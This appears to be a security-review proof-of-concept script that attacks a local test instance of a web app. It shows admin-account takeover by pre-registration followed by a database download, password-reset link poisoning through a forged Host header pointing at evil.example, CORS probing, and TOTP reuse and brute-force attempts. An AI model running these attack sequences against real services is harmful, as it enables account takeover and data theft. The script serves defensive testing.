const c = require("/home/claude/ele-quoting-engine/.claude/worktrees/sec-review/tools/security/review/lib/common.js");
const totp = require("/home/claude/ele-quoting-engine/.claude/worktrees/sec-review/server/security/totp");
const crypto = require("crypto");
(async () => {
  // ---- A: pre-registration of ADMIN_EMAIL, owner clicks the confirmation link
  let s = await c.start({ mailer: true });
  try {
    const atkIp = "198.51.100.66", ownerIp = "203.0.113.1";
    const atkPw = "Aa1-" + crypto.randomBytes(9).toString("base64url");
    const reg = await s.post("/api/auth/register", { email: s.adminEmail, password: atkPw, name: "x" }, { ip: atkIp, headers: { "X-Form-Token": s.formToken("register") } });
    const atkTok = reg.body.token;
    console.log("A attacker registers ADMIN_EMAIL:", reg.status, "role", reg.body.user.role);
    // The owner tries to register, is told the account exists, finds a "confirm your email" message from his own shop and opens it.
    const mail = s.mail(s.adminEmail, /confirm your email/i).pop();
    const vtok = (mail.text.match(/#token=(\S+)/) || [])[1];
    const v = await s.post("/api/auth/verify-email", { token: vtok }, { ip: ownerIp });
    console.log("A owner opens the confirmation link:", v.status, v.body);
    const prof = await s.get("/api/auth/profile", { token: atkTok, ip: atkIp });
    console.log("A attacker's old session now:", prof.status, prof.body.role, "twoFactorRequired", prof.body.twoFactorRequired);
    const setup = await s.post("/api/auth/2fa/setup", { password: atkPw }, { token: atkTok, ip: atkIp });
    const secret = setup.body.setupKey.replace(/\s/g, "");
    const en = await s.post("/api/auth/2fa/enable", { code: totp.codeAt(secret) }, { token: atkTok, ip: atkIp });
    console.log("A attacker enrols own authenticator:", setup.status, en.status);
    const bk = await s.get("/api/admin/backup/db", { token: en.body.token, ip: atkIp });
    console.log("A attacker downloads the database:", bk.status, bk.headers["content-type"], bk.buffer.length, "bytes");
    const pr = await s.req({ method: "PUT", url: "/api/admin/pricing", json: { rules: { minimumOrderTotal: 1 }, note: "x" }, token: en.body.token, ip: atkIp });
    console.log("A attacker edits pricing:", pr.status);
  } finally { await s.stop(); }

  // ---- B: host header, no FRONTEND_URL
  s = await c.start({ mailer: true, env: { FRONTEND_URL: "" } });
  try {
    const ip = "203.0.113.5";
    await s.register("a@example.test", { ip, headers: { Host: "evil.example" } }).catch((e) => console.log("B register:", e.message.slice(0, 80)));
    const m = s.mail("a@example.test", /confirm/i).pop();
    console.log("B verify link host with Host: evil.example ->", m && m.text.match(/https?:\/\/[^\s/]+/)[0]);
    await s.post("/api/auth/password-reset/request", { email: "a@example.test" }, { ip, headers: { "X-Form-Token": s.formToken("password-reset"), Host: "evil.example", "X-Forwarded-Host": "evil.example" } });
    await c.sleep(300);
    const rm = s.mail("a@example.test", /password/i).pop();
    console.log("B reset link host ->", rm && rm.text.match(/https?:\/\/[^\s/]+/)[0]);
    // CORS with forged Host
    const cr = await s.req({ method: "OPTIONS", url: "/api/auth/profile", ip, headers: { Origin: "https://evil.example", Host: "evil.example", "X-Forwarded-Proto": "https", "Access-Control-Request-Method": "PUT", "Access-Control-Request-Headers": "x-csrf-token,content-type" } });
    console.log("B preflight from evil origin w/ matching Host:", cr.status, cr.headers["access-control-allow-origin"], cr.headers["access-control-allow-credentials"]);
    const cr2 = await s.req({ method: "OPTIONS", url: "/api/auth/profile", ip, headers: { Origin: "https://evil.example", "Access-Control-Request-Method": "PUT" } });
    console.log("B preflight from evil origin, real Host:", cr2.status, cr2.headers["access-control-allow-origin"]);
  } finally { await s.stop(); }

  // ---- C: 2FA reuse + brute force accounting
  s = await c.start({ mailer: true });
  try {
    const ipO = "203.0.113.1";
    await s.admin({ ip: ipO });
    const pw = s.passwords[s.adminEmail];
    const login = (extra, ip = ipO) => s.post("/api/auth/login", { email: s.adminEmail, password: pw, ...extra }, { ip });
    const code = totp.codeAt(s.adminSecret, Date.now() + 30000); // next step (enrolment used the current one)
    const a = await login({ totp: code }), b = await login({ totp: code });
    console.log("C same code twice:", a.status, b.status, b.body.code);
    await s.post("/api/auth/login", { email: s.adminEmail, password: pw }, { ip: ipO });
    let n = 0, last;
    for (let i = 0; i < 12; i++) { last = await login({ totp: String(100000 + i) }, c.randomIp()); if (last.status === 401) n++; else break; }
    console.log("C wrong codes accepted before pause (knowing the password, rotating IPs):", n, "then", last.status, last.body.code);
    // recovery code guesses through a signed-in admin session: per-IP only?
    s2 = a.body.token; let m = 0, r;
    for (let i = 0; i < 45; i++) { r = await s.post("/api/auth/2fa/recovery-codes", { code: String(200000 + i) }, { token: s2, ip: `198.51.100.${1 + (i % 3)}` }); if (r.status === 400) m++; }
    console.log("C wrong codes on /2fa/recovery-codes with a session over 3 IPs:", m, "of 45 processed; last", r.status);
  } finally { await s.stop(); }
})().catch((e) => { console.error(e); process.exit(1); });
